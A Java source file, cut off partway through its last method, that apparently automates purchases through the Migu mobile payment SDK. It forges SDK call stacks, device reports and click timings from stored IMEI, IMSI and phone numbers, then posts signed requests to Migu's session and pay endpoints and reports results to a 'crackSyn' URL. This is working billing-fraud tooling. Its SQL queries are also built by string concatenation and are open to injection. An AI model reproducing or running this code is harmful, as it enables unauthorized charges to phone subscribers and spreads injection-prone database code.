package com.astrolink.dao;

import java.net.URLEncoder;
import java.sql.SQLException;
import java.util.Map;

import org.apache.log4j.Logger;

import com.astrolink.consts.Const;
import com.astrolink.domain.SupportAttrLog;
import com.astrolink.logic.listener.JobThread;
import com.astrolink.service.IExecFinish;
import com.astrolink.util.tools.BasicsTools;
import com.astrolink.util.tools.DbTools;
import com.astrolink.util.tools.ExceptionTool;
import com.astrolink.util.tools.ExceptionTools;
import com.astrolink.util.tools.GetNetWork;
import com.astrolink.util.tools.business.DmNetTools20;
import com.astrolink.util.tools.business.DmNetWorkIO;
import com.astrolink.util.tools.business.DmTools20;
import com.sun.rowset.CachedRowSetImpl;

import net.sf.json.JSONObject;

/**
 * 逻辑线程
 * 
 * @author cuilei
 * @date 2015-11-30
 */
public class DmSmsPay20ExecLinstenerThreadDao extends JobThread {
	private Logger logger = Logger.getLogger(DmSmsPay20ExecLinstenerThreadDao.class);
	public SupportAttrLog supportAttrLog;
	public IExecFinish execFinish;
	private String[] callstacks = new String[] { "com.migu.sdk.c.a$1.run(MiguMainSDK.java:112)|2", "com.migu.sdk.inter.impl.e$2.run(SMSGetPhoneImpl.java:72)|2", "com.openx.greq.c.c$3.run(Client.java:127)|2", "com.migu.sdk.a.b$6.run(CatchLog.java:679)|2", "com.migu.sdk.ui.base.BaseView$1.onTouch(BaseView.java:522)|2", "com.openx.greq.c.c$3.run(Client.java:127)|2" };

	public DmSmsPay20ExecLinstenerThreadDao(SupportAttrLog supportAttrLog) {
		this.supportAttrLog = supportAttrLog;
	}

	public void setExecFinish(IExecFinish execFinish) {
		this.execFinish = execFinish;
	}

	@Override
	public void exec() {
		logger.info("开始动漫20计费确认，id为" + this.getKey());
		JSONObject attrInfoY = null;
		JSONObject attrInfo = null;
		long startmillis = 0;
		long webmillis = 0;
		Map<String, String> headers = null;
		String ChargePolicy = "";
		String ChannelFlag = "";
		String RedUserFlag = "";
		String phoneNumber = "";
		boolean type = false;
		boolean billingType = true;
		boolean payTimelimitType=false;
		try {
			attrInfoY = supportAttrLog.getSupportAttrInfoToJSON();
			attrInfo = supportAttrLog.getSupportAttrInfoToJSON();
			if (attrInfo != null) {
				payTimelimitType=payTimelimit(attrInfo.getString("imsi"));
				if (payTimelimitType) {//计费时间间隔

					
					if (attrInfo.getString("EN").equals("N")) {// 2.0+
						if(!attrInfo.getString("spProductId").equals("2086")){
							callstacks = new String[] { "com.migu.sdk.c.a$1.run(MiguMainSDK.java:112)|2", 
									"com.migu.sdk.inter.impl.e$2.run(SMSGetPhoneImpl.java:72)|2", 
									"com.openx.greq.c.c$3.run(Client.java:127)|2",
									"com.migu.sdk.a.b$6.run(CatchLog.java:679)|2",
									"com.migu.sdk.ui.PayView$3.onClick(PayView.java:281)|2", 
									"com.openx.greq.c.c$3.run(Client.java:127)|2" };
						}else{
							callstacks = new String[] {"com.migu.sdk.c.a$1.run(MiguMainSDK.java:119)|2|java.lang.Thread|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"), 
									"com.migu.sdk.inter.impl.d$2.run(SMSGetPhoneImpl.java:72)|2|android.os.Handler|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"),
									"com.openx.greq.c.c$3.run(Client.java:127)|2|android.os.Handler|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"),
									"com.migu.sdk.a.b$3.run(CatchLog.java:293)|2|java.util.concurrent.ThreadPoolExecutor|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"),
									"com.migu.sdk.ui.base.BaseView$1.onTouch(BaseView.java:522)|2|android.view.View|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"), 
									"com.openx.greq.c.c$3.run(Client.java:127)|2|android.os.Handler|0|"+attrInfo.getString("localsessionid")+"|"+attrInfo.getString("imei")+"|"+attrInfo.getString("imsi")+"|"+attrInfo.getString("encodecid"),
							};
						}
					}

					int supportState = logicLimit(phoneNumber, attrInfo.getString("imsi"), attrInfo.getString("linkId"), attrInfo.getString("cpInfoId"), attrInfo.getString("ssid") + "");
					if (supportState <= 1000001) {

						if (attrInfo.getInt("responseType") != 2 && attrInfo.getInt("responseType") != 3) {
							type = false;
						} else {
							type = true;
						}

						if (type) {
							//String sqlStr = "SELECT b.* FROM support_exec_log AS a " + "INNER JOIN support_attr_log AS b ON a.id=supportExecLogId " + "WHERE  imsi='" + attrInfo.getString("imsi") + "'  AND execStep>3 ORDER BY updateDate DESC LIMIT 1";
							String sqlStr = "SELECT b.* FROM support_exec_log AS a "+
							"INNER JOIN support_attr_log AS b ON a.id=supportExecLogId "+ 
							"INNER JOIN dic_feecode_info AS c ON a.ssid=c.spProductConsumeCodeId "+
							"WHERE  imsi='" + attrInfo.getString("imsi") + "'  AND execStep>3 AND c.spProductId='" + attrInfo.getString("spProductId") + "' ORDER BY updateDate DESC LIMIT 1";
							
							DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
							CachedRowSetImpl crsl = dt.executeQuery(sqlStr, DmSmsPay20ExecLinstenerThreadDao.class);
							if (crsl.size() != 0) {
								while (crsl.next()) {
									attrInfo = JSONObject.fromObject(crsl.getString("supportAttrInfo"));
									attrInfo.put("ItemId", attrInfoY.getString("ItemId")); // "ItemId":
									attrInfo.put("PayCode", attrInfoY.getString("PayCode")); // "PayCode":
									attrInfo.put("Fee", attrInfoY.getString("Fee")); // "Fee":
									attrInfo.put("currentmillis", System.currentTimeMillis());

									attrInfo.put("imei", attrInfoY.optString("imei"));
									attrInfo.put("imsi", attrInfoY.optString("imsi"));
									attrInfo.put("consumeCode", attrInfoY.optString("consumeCode"));
									attrInfo.put("cpparam", attrInfoY.optString("cpparam"));
									attrInfo.put("cpInfoId", attrInfoY.optString("cpInfoId"));
									attrInfo.put("platformChannelCode", attrInfoY.optString("platformChannelCode"));
									attrInfo.put("ssid", attrInfoY.optString("ssid"));
									
									billingType = true;
								}
							} else {
								billingType = false;
							}
						}
						if (billingType) {
							headers = DmTools20.initHeaders(attrInfo.getString("apiVersion"), attrInfo.getString("SDKVersion"), attrInfo.getString("SEC_VERSION"), attrInfo.getString("nRQd_Lx"), attrInfo.getString("EN"), attrInfo.getString("imsi"), attrInfo.getString("imei"), attrInfo.getString("mg20irid"),attrInfo.getString("spProductId"));
							startmillis = attrInfo.getLong("startmillis");
							webmillis = attrInfo.getLong("webmillis");
							ChargePolicy = attrInfo.getString("ChargePolicy");
							ChannelFlag = attrInfo.getString("ChannelFlag");
							RedUserFlag = attrInfo.getString("RedUserFlag");
							
							for (int i = 0; i < 3; i++) {// 开始计费
								if (billing(attrInfo.getString("localsessionid"), startmillis, headers, attrInfo.getString("BaseClientHeader"), webmillis, ChargePolicy, ChannelFlag, RedUserFlag, attrInfo)) {
									break;
								}
							}
						}
					} else {
						execStep(attrInfo, "-17", supportState + "", "");
					}
				}
			} else {
				execStep(attrInfo, "-18", "-18", "attrInfo is null");
			}
		} catch (Exception e) {
			logger.error(ExceptionTools.exception(e));
			execStep(attrInfo, "-19", "-19", "Exception");
		} finally {
			boolean execType=false;
			try {
				if(attrInfo == null){
					updataExecLog(supportAttrLog.getSupportExecLogId(), attrInfo);
					execType=true;
				}
				
				if (payTimelimitType) {
					if(billingType){
						try {
							updataAttr(attrInfo, supportAttrLog.getSupportExecLogId());
							sevePayResultLog(attrInfo, supportAttrLog);
						} catch (Exception e2) {
							logger.error(ExceptionTools.exception(e2));
						}
						if(updataExecLog(supportAttrLog.getSupportExecLogId(), attrInfo)){
							execType=true;
						}
					}else{
						execType=true;
						extended(supportAttrLog);
					}
				}else{
					execType=true;
					extended(supportAttrLog);
				}
			} catch (Exception e2) {
				logger.error(ExceptionTools.exception(e2));
			}finally {
				if(execType){
					if (execFinish != null) {
						execFinish.execDone(this.getKey());
						logger.info("处理请求结束，id为" + this.getKey());
					}
				}
			}
		}
	}
	
	public void extended(SupportAttrLog supportAttrLog) {
		String sql = "UPDATE support_exec_log SET execNum = execNum+1,updateDate = DATE_ADD(NOW(),INTERVAL 1 MINUTE),random=0 where id=" + supportAttrLog.getSupportExecLogId();
		DbTools dt1 = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
		dt1.upDate(sql, DmSmsPay20ExecLinstenerThreadDao.class);
	} 
	
	public void sevePayResultLog(JSONObject attrInfo, SupportAttrLog supportAttrLog) {
		JSONObject dataInfo = new JSONObject();
		dataInfo.put("execLogId", supportAttrLog.getSupportExecLogId());
		dataInfo.put("status", attrInfo.optString("execResultCode", "-1"));
		dataInfo.put("message", attrInfo.optString("execResultInfo", "error"));
		dataInfo.put("imei", attrInfo.optString("imei"));
		dataInfo.put("imsi", attrInfo.optString("imsi"));
		dataInfo.put("monum", "1065842232");
		dataInfo.put("consumeCode", attrInfo.optString("consumeCode"));
		dataInfo.put("cpparam", attrInfo.optString("cpparam"));
		dataInfo.put("execNum", supportAttrLog.getExecNum());
		dataInfo.put("phoneNumber", attrInfo.optLong("phoneNumber"));
		dataInfo.put("cpInfoId", attrInfo.optString("cpInfoId"));
		dataInfo.put("transId", attrInfo.optString("OrderId") + BasicsTools.getUuid(true, 5, Const.random));
		dataInfo.put("dayTime", BasicsTools.getForDate("yyyy-MM-dd"));
		dataInfo.put("inputDate", BasicsTools.getForDate("yyyy-MM-dd HH:mm:ss"));
		dataInfo.put("methodType", supportAttrLog.getMethodType());
		dataInfo.put("channelId", attrInfo.optString("platformChannelCode"));
		dataInfo.put("infoCode", 0);
		dataInfo.put("ssid", attrInfo.optString("ssid"));
		if (attrInfo.optString("proxyIp").equals("")) {
			dataInfo.put("proxyIp", "");
		} else {
			dataInfo.put("proxyIp", attrInfo.optString("proxyIp"));
		}

	/*	if (dataInfo.getString("status").equals("0")) {
			try {
				String upTime = "UPDATE spinfo.support_exec_log AS a INNER JOIN ( " + " SELECT spProductConsumeCodeId FROM `sp_product_consumecode` WHERE spProductId=(SELECT spProductId FROM spInfo.`sp_product_consumecode` WHERE `spProductConsumeCodeId`='" + attrInfo.optString("ssid") + "') " + " ) AS b " + " SET updateDate = NOW() " + " WHERE a.ssid=b.spProductConsumeCodeId AND imsi='" + attrInfo.optString("imsi") + "' AND responseType=3 ";
				DbTools dtTime = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
				dtTime.upDate(upTime, Z_DmSmsExecLinstenerThreadDao.class);
			} catch (Exception e) {
				logger.error(ExceptionTools.exception(e));
			}
		}*/

		try {
			crackSyn(dataInfo, crackSynUrl(dataInfo, supportAttrLog.getCrackSynUrl()));
		} catch (Exception e) {
			logger.error(ExceptionTools.exception(e));
		}

		DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
		logger.info("sevePayResultLog：" + dt.insertJson("support_pay_result", dataInfo, DmSmsPay20ExecLinstenerThreadDao.class));
	}
	
	public void crackSyn(JSONObject dataInfo, String url) {
		GetNetWork get = new GetNetWork(url);
		get.executeMethod();
		dataInfo.put("synUrl", url);
		dataInfo.put("synstatus", get.getNetState());
		dataInfo.put("synresult", get.getString().replaceAll("'", ""));
	}
	
	public String crackSynUrl(JSONObject dataInfo, String crackSynUrl) { 
		StringBuffer sbuff = new StringBuffer();
		sbuff.append(crackSynUrl);
		sbuff.append("?").append("mobile=").append(dataInfo.optString("phoneNumber"));
		sbuff.append("&").append("cpid=").append(dataInfo.optString("cpInfoId"));
		sbuff.append("&").append("cpparam=").append(dataInfo.optString("cpparam"));
		sbuff.append("&").append("monum=").append(dataInfo.optString("monum"));
		sbuff.append("&").append("sid=").append(dataInfo.optString("consumeCode"));
		sbuff.append("&").append("imei=").append(dataInfo.optString("imei"));
		sbuff.append("&").append("imsi=").append(dataInfo.optString("imsi"));
		sbuff.append("&").append("linkId=").append(dataInfo.optString("transId"));
		sbuff.append("&").append("status=").append(dataInfo.optString("status"));
		sbuff.append("&").append("chid=").append(dataInfo.optString("platformChannelCode"));
		sbuff.append("&").append("spProductConsumeCodeId=").append(dataInfo.optString("ssid"));
		sbuff.append("&").append("mobile").append(dataInfo.optString("phoneNumber"));
		try {
			sbuff.append("&").append("message=").append(URLEncoder.encode(dataInfo.optString("message"), "utf-8"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return sbuff.toString();
	}


	private boolean payTimelimit(String imsi) {
		try {
			String sqlStr = " SELECT (UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(updateDate)) AS timeNum FROM support_exec_log AS a WHERE imsi='"+imsi+"' AND execStep>3 ORDER BY updateDate DESC LIMIT 1";
			DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
			CachedRowSetImpl crsl = dt.executeQuery(sqlStr, DmSmsLogin20ExecLinstenerThreadDao.class);
			if (crsl.size() != 0) {
				crsl.next();
				if(crsl.getInt("timeNum")>=60){
					return true;
				}else{
					return false;
				}
			}else{
				return true;
			}
		} catch (Exception e) {
			logger.error(ExceptionTool.getErrorInfo(e));
			return false;
		}
	}

	public int logicLimit(String mobile, String imsi, String linkId, String cpInfoId, String getSpProductConsumeCodeId) {
		try {
			String provId = mobileToProvId(mobile);
			int infoCode = -1;
			String sqlStr = "SELECT spinfo.logic_limit('" + mobile + "','" + imsi + "'," + cpInfoId + "," + provId + "," + getSpProductConsumeCodeId + "," + linkId + ") as infoCode ";
			DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
			CachedRowSetImpl crsi = dt.executeQuery(sqlStr, DmSmsPay20ExecLinstenerThreadDao.class);
			while (crsi.next()) {
				infoCode = crsi.getInt("infoCode");
			}
			return infoCode;
		} catch (Exception e) {
			logger.error(ExceptionTool.getErrorInfo(e));
			return -1;
		}
	}

	public String mobileToProvId(String mobile) {
		if (mobile.length() > 7) {
			String sql = "SELECT provCode FROM spinfo.mob_city WHERE mob7=" + mobile.substring(0, 7);
			DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
			CachedRowSetImpl crsi = dt.executeQuery(sql, DmSmsPay20ExecLinstenerThreadDao.class);
			try {
				while (crsi.next()) {
					return crsi.getString("provCode");
				}
			} catch (SQLException e) {
				logger.error(ExceptionTool.getErrorInfo(e));
				return "-1";
			}
		}
		return "-1";
	}

	private boolean billing(String localsessionid, long startmillis, Map<String, String> headers, String BaseClientHeader, long webmillis, String ChargePolicy, String ChannelFlag, String RedUserFlag, JSONObject attrInfo) {
		try {
			String ReportStr;

			int netcount = attrInfo.getInt("netcount");
			int paycount = attrInfo.getInt("paycount");
			String PayCode = attrInfo.getString("PayCode");
			String AppId = attrInfo.getString("AppId");
			String channelId = attrInfo.getString("channelId");
			String phoneNumber = attrInfo.getString("phoneNumber");
			String imei = attrInfo.getString("imei");
			String imsi = attrInfo.getString("imsi");
			String encodecid = attrInfo.getString("encodecid");
			String apkstatus = attrInfo.getString("apkstatus");
			String MiguPay_FileSHA1 = attrInfo.getString("MiguPay_FileSHA1");
			String local_ip = attrInfo.getString("local_ip");
			String cpId = attrInfo.getString("cpId");
			String contentId = attrInfo.getString("contentId");
			String ChannelCode = attrInfo.getString("ChannelCode");
			String productId = attrInfo.getString("productId");
			String mg20irid = attrInfo.getString("mg20irid");
			String cpparam = attrInfo.getString("cpparam");
			String Fee = attrInfo.getString("Fee");
			String ItemId = attrInfo.getString("ItemId");
			String Hardware = attrInfo.getString("Hardware");
			String startcount = attrInfo.getString("startcount");
			String packageName = attrInfo.getString("packagename");
			long startTime = attrInfo.getLong("startTime");

			long currentmillis = attrInfo.getLong("currentmillis") + 20000 + DmTools20.getRandom(100000);
			String startSecond = attrInfo.getString("startSecond");

			// 获取订单
			String OrderId = DmNetTools20.getOrderId(PayCode, AppId, channelId, currentmillis, attrInfo.getString("EN"));

			currentmillis = currentmillis + 100 + DmTools20.getRandom(200);
			String webSecond = (currentmillis - webmillis) / 1000 + "";
			startSecond = (Integer.parseInt(startSecond) + Integer.parseInt(webSecond)) + "";
			webmillis = currentmillis;
			
			if(!attrInfo.getString("spProductId").equals("2086")){
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, "", DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "", "", "", "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[3], attrInfo.getString("isRoot"), localsessionid);
			}else{
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, "", DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "", "", "", "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[3]);
			}
			
			netcount++;
			String tl_tcttl_recordPolicyLog_req = DmTools20.generate_tl_tcttl_recordPolicyLog(BaseClientHeader, DmTools20.getLogTimeStampByMillis(currentmillis), phoneNumber, attrInfo.getString("Ctype"), OrderId, phoneNumber, cpId, contentId, ChannelCode, productId, "", ChargePolicy, ChannelFlag, RedUserFlag,attrInfo.getString("spProductId"));
			String tl_tcttl_recordPolicyLog_rsp = post_tl_tcttl(headers, mg20irid, tl_tcttl_recordPolicyLog_req, ReportStr, attrInfo.getString("miguEDVersion"));
			if (!DmTools20.getContextByTag(tl_tcttl_recordPolicyLog_rsp, "ResultCode").equals("0")) {
				tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "4", DmTools20.getContextByTag(tl_tcttl_recordPolicyLog_rsp, "ResultCode"), tl_tcttl_recordPolicyLog_rsp);
				return false;
			}
			// 点击计费
			currentmillis = currentmillis + 2000 + DmTools20.getRandom(10000);
			webSecond = (currentmillis - webmillis) / 1000 + "";
			startSecond = (Integer.parseInt(startSecond) + Integer.parseInt(webSecond)) + "";
			webmillis = currentmillis;
			
			if(!attrInfo.getString("spProductId").equals("2086")){
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, "", DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "", "", "", "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[4], attrInfo.getString("isRoot"), localsessionid);
			}else{
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, "", DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "", "", "", "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[4]);
			}
			netcount++;

			String charge_sessionReq_req = DmTools20.generate_charge_sessionReq(ChargePolicy, phoneNumber, DmTools20.getLogTimeStampByMillis(currentmillis), attrInfo.getString("Ctype"), OrderId, Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam);
			String charge_sessionReq_rsp = post_charge_sessionReq(headers, mg20irid, charge_sessionReq_req, ReportStr, attrInfo.getString("miguEDVersion"));
			if (!DmTools20.getContextByTag(charge_sessionReq_rsp, "ResultCode").equals("0")) {
				tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "5", DmTools20.getContextByTag(charge_sessionReq_rsp, "ResultCode"), charge_sessionReq_rsp);
				return false;
			}

			String ihJVd = DmTools20.getContextByTag(charge_sessionReq_rsp, "ihJVd");
			String Lwkn = DmTools20.getContextByTag(charge_sessionReq_rsp, "Lwkn");
			String[] charge_sessionReq_rsp_dec = DmNetTools20.DecryptNet1(mg20irid, DmTools20.getContextByTag(charge_sessionReq_rsp, "Enc"));
			if (charge_sessionReq_rsp_dec == null) {
				tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "6", "", charge_sessionReq_rsp);
				return false;
			}
			String websessionid = charge_sessionReq_rsp_dec[0].substring(1, 9);
			currentmillis = currentmillis + 500 + DmTools20.getRandom(1000);
			webSecond = (currentmillis - webmillis) / 1000 + "";
			startSecond = (Integer.parseInt(startSecond) + Integer.parseInt(webSecond)) + "";
			webmillis = currentmillis;

			paycount++;
			if (paycount == 1) {
				apkstatus = DmTools20.chargeApkstatus(apkstatus);
			}else{
				apkstatus = attrInfo.getString("apkstatus");
			}
			
			attrInfo.put("apkstatus", apkstatus);
			String ChargePolicyStatus = "status=0,get=" + ChargePolicy + ",use=" + ChargePolicy;
			String payInfo = ",," + productId + ",;" + cpId + "," + ChannelCode + "," + productId + ",";
			if(!attrInfo.getString("spProductId").equals("2086")){
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, websessionid, DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "0", ChargePolicyStatus, payInfo, "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[5], attrInfo.getString("isRoot"), localsessionid);
			}else{
				ReportStr = DmTools20.generate_ReportStr(phoneNumber, imei, imsi, encodecid, websessionid, DmTools20.getSmsTimeStampByMillis(currentmillis), apkstatus, netcount, paycount, startcount, startSecond, webSecond, attrInfo.getString("soVersion"), attrInfo.getString("migusdkversion"), "0", ChargePolicyStatus, payInfo, "", "", MiguPay_FileSHA1, attrInfo.getString("Serial"), attrInfo.getString("linux_version"), Hardware, local_ip, callstacks[5]);
			}
			netcount++;

			headers.put("kyMy", ihJVd);
			headers.put("ssov", attrInfo.getString("miguEDVersion"));
			String charge_payReq_req = DmTools20.generate_charge_payReq(BaseClientHeader, ChargePolicy, phoneNumber, ChannelFlag, DmTools20.getLogTimeStampByMillis(currentmillis), attrInfo.getString("Ctype"), OrderId, Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam,attrInfo.getString("spProductId"));

			// String edstr =
			// DmTools20.generate_charge_payReq_EDstr(attrInfo.getString("miguEDVersion").substring(attrInfo.getString("miguEDVersion").indexOf(".")
			// + 1), DmTools20.getSmsTimeStampByMillis(currentmillis - (8 * 60 *
			// 60 * 1000)), imei, paycount, startSecond, mg20irid, OrderId,
			// phoneNumber);
			String edstr = DmTools20.generate_charge_payReq_EDstr(attrInfo.getString("miguEDVersion").substring(attrInfo.getString("miguEDVersion").indexOf(".") + 1), DmTools20.getSmsTimeStampByMillis(currentmillis - (8 * 60 * 60 * 1000)), imei, paycount, startSecond, mg20irid, OrderId, phoneNumber, packageName, startTime);

			
			
			String charge_payReq_rsp = post_charge_payReq(headers, mg20irid, charge_payReq_req, ReportStr, ihJVd, Lwkn, edstr, attrInfo.getString("miguEDVersion"));
			if (!DmTools20.getContextByTag(charge_payReq_rsp, "ResultCode").equals("0")) {
				tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "7", DmTools20.getContextByTag(charge_payReq_rsp, "ResultCode"), charge_payReq_rsp);
				return false;
			}

			attrInfo.put("OrderId", OrderId);
			attrInfo.put("currentmillis", currentmillis);
			attrInfo.put("netcount", netcount);
			headers.remove("kyMy");
			headers.remove("ssov");
			
			String[] charge_payReq_rsp_dec = DmNetTools20.DecryptNet1(mg20irid, DmTools20.getContextByTag(charge_payReq_rsp, "Enc"));
			if (charge_payReq_rsp_dec != null && DmTools20.getContextByTag(charge_payReq_rsp_dec[1], "ResultCode").equals("0")) {
				tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "9", DmTools20.getContextByTag(charge_payReq_rsp_dec[1], "ResultCode"), charge_payReq_rsp_dec[1]);
				return true;
			} else {
				if (charge_payReq_rsp_dec == null) {
					tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "8", "", "");
				} else {
					tempAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount, "8", DmTools20.getContextByTag(charge_payReq_rsp_dec[1], "ResultCode"), charge_payReq_rsp_dec[1]);
				}
				return false;
			}
		} catch (Exception e) {
			logger.error(ExceptionTools.exception(e));
			return false;
		}
	}

	private void execStep(JSONObject attrInfo, String execStep, String execResultCode, String execResultInfo) {
		attrInfo.put("execStep", execStep);
		attrInfo.put("execResultCode", String.valueOf(execResultCode).replaceAll("\"", ""));
		attrInfo.put("execResultInfo", String.valueOf(execResultInfo).replaceAll("\"", ""));
	}

	private void tempAttr(JSONObject attrInfo, long currentmillis, long startmillis, long webmillis, String webSecond, String startSecond, int netcount, int paycount, String execStep, String execResultCode, String execResultInfo) {
		stepAttr(attrInfo, currentmillis, startmillis, webmillis, webSecond, startSecond, netcount, paycount);
		execStep(attrInfo, execStep, execResultCode, execResultInfo);
	}

	private void stepAttr(JSONObject attrInfo, long currentmillis, long startmillis, long webmillis, String webSecond, String startSecond, int netcount, int paycount) {
		attrInfo.put("currentmillis", currentmillis);
		attrInfo.put("startmillis", startmillis);
		attrInfo.put("webmillis", webmillis);
		attrInfo.put("webSecond", webSecond);
		attrInfo.put("startSecond", startSecond);
		attrInfo.put("netcount", netcount);
		attrInfo.put("paycount", paycount);
	}

	public void updataAttr(JSONObject attrInfo, long id) {
		try {
			DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
			logger.info("updateExecNum：" + dt.upDate("UPDATE support_attr_log SET supportAttrInfo = '" + attrInfo.toString() + "' WHERE supportExecLogId = '" + id + "'", DmSmsPay20ExecLinstenerThreadDao.class));
		} catch (Exception e) {
			logger.error(ExceptionTools.exception(e));
		}
	}

	public boolean updataExecLog(long id, JSONObject attrInfo) {
		StringBuffer sqlBuff = new StringBuffer();
		sqlBuff.append("UPDATE support_exec_log SET execNum = execNum+1,execState = '1',updateDate=NOW(),execStep='" + attrInfo.optString("execStep", "-1") + "',execResultCode='" + attrInfo.optString("execResultCode", "-1") + "',execResultInfo='" + attrInfo.optString("execResultInfo", "error") + "' WHERE id= '").append(id).append("'");
		DbTools dt = new DbTools(Const.DB_SPINFO_URL, Const.DB_MYSQL_DRIVER, Const.DB_SPINFO_USERNAME, Const.DB_SPINFO_PASSWORD);
		return dt.upDate(sqlBuff.toString(), DmSmsPay20ExecLinstenerThreadDao.class);
	}

	public String post_tl_tcttl(Map<String, String> headers, String mg20irid, String xml, String ReportStr, String ssov) {
		// logger.info("\r\n");
		String result = "";// com.openx.greq.request.Client$3.run(Client.java:127)|2
		String charge_getSession_req = DmNetTools20.generateNetSignatureAndEncrypt(mg20irid, ReportStr, xml, "", "", "", ssov);
		// logger.info("post_tl_tcttl.charge_getSession_req:"+charge_getSession_req);
		String Signature = DmTools20.HmacSHA1("+  +POST+en_tcttlreq=" + charge_getSession_req + headers.get("Header-Key"), "  &");
		// logger.info("post_tl_tcttl.Signature:"+Signature);
		headers.put("X-OF-Signature", Signature);
		headers.put("Header-Signature", Signature);
		charge_getSession_req = DmTools20.URLencode(charge_getSession_req);
		DmNetWorkIO dmn = new DmNetWorkIO();
		result = dmn.netWorkIO("http://gmota.g188.net:8080/migusdk/tl/tcttl", headers, "en_tcttlreq=" + charge_getSession_req);
		// logger.info("post_tl_tcttl.charge_getSession_req:"+charge_getSession_req);
		// logger.info("post_tl_tcttl.result:"+result);
		return result;
	}

	public String post_charge_sessionReq(Map<String, String> headers, String mg20irid, String xml, String ReportStr, String ssov) {
		// logger.info("\r\n");
		String result = "";
		String charge_getSession_req = DmNetTools20.generateNetSignatureAndEncrypt(mg20irid, ReportStr, xml, "", "", "", ssov);
		// logger.info("post_charge_sessionReq.charge_getSession_req:"+charge_getSession_req);
		String Signature = DmTools20.HmacSHA1("+  +POST+en_sessionReq=" + charge_getSession_req + headers.get("Header-Key"), "  &");
		// logger.info("post_charge_sessionReq.Signature:"+Signature);
		headers.put("X-OF-Signature", Signature);
		headers.put("Header-Signature", Signature);
		charge_getSession_req = DmTools20.URLencode(charge_getSession_req);
		DmNetWorkIO dmn = new DmNetWorkIO();
		result = dmn.netWorkIO("http://gmota.g188.net:8080/migusdk/charge/sessionReq", headers, "en_sessionReq=" + charge_getSession_req);
		// logger.info("post_charge_sessionReq.charge_getSession_req:"+charge_getSession_req);
		// logger.info("post_charge_sessionReq.result:"+result);
		return result;
	}

	public String post_charge_payReq(Map<String, String> headers, String mg20irid, String xml, String ReportStr, String ihJVd, String Lwkn, String EDstr, String ssov) {
		String result = "";
